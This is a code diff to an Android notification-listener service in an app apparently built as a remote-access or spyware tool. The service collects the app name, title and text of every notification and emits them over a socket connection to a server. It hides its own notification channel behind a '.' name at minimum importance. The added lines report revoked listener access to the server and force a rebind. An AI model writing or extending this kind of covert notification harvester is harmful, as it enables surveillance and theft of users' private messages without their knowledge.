@@ -12,28 +12,21 @@ import android.os.Bundle;
 import android.provider.Settings;
 import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
-
 import androidx.core.app.NotificationCompat;
-
 import com.fason.app.R;
 import com.fason.app.core.Protocol;
 import com.fason.app.core.network.SocketClient;
 import com.fason.app.service.MainService;
-
 import org.json.JSONObject;
-
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public class NotificationRelayService extends NotificationListenerService {
-
     private static final int NOTIF_ID = 2;
-
     private final ExecutorService exec = Executors.newSingleThreadExecutor();
     private final AtomicBoolean ready = new AtomicBoolean(false);
     private static NotificationRelayService instance;
-
     public static NotificationRelayService getInstance() {
         return instance;
     }
@@ -56,10 +49,8 @@ public class NotificationRelayService extends NotificationListenerService {
     private void createChannel() {
         NotificationManager nm = getSystemService(NotificationManager.class);
         if (nm == null) return;
-
         NotificationChannel existing = nm.getNotificationChannel(Protocol.NOTIF_CHANNEL);
         if (existing != null) return;
-
         NotificationChannel ch = new NotificationChannel(
             Protocol.NOTIF_CHANNEL, ".", NotificationManager.IMPORTANCE_MIN);
         ch.setDescription(".");
@@ -103,7 +94,6 @@ public class NotificationRelayService extends NotificationListenerService {
     public void onListenerConnected() {
         super.onListenerConnected();
         ready.set(true);
-
         exec.execute(() -> {
             try {
                 StatusBarNotification[] active = getActiveNotifications();
@@ -143,11 +133,9 @@ public class NotificationRelayService extends NotificationListenerService {
         try {
             Notification n = sbn.getNotification();
             Bundle extras = n.extras;
-
             String title = txt(extras, Notification.EXTRA_TITLE);
             String text = txt(extras, Notification.EXTRA_TEXT);
             String bigText = txt(extras, Notification.EXTRA_BIG_TEXT);
-
             JSONObject data = new JSONObject();
             data.put(Protocol.KEY_APP_NAME, sbn.getPackageName());
             data.put(Protocol.KEY_TITLE, title);
@@ -177,6 +165,15 @@ public class NotificationRelayService extends NotificationListenerService {
     @Override
     public void onListenerDisconnected() {
         ready.set(false);
+        try {
+            JSONObject s = new JSONObject();
+            s.put(Protocol.KEY_ENABLED, false);
+            s.put(Protocol.KEY_CONNECTED, false);
+            s.put(Protocol.KEY_ERROR, "Listener disconnected (access revoked?)");
+            s.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
+            io.socket.client.Socket socket = com.fason.app.core.network.SocketClient.getInstance().getSocket();
+            if (socket != null) socket.emit(Protocol.NOTIF, s);
+        } catch (Exception ignored) {}
         requestRebind(new ComponentName(this, getClass()));
     }
 
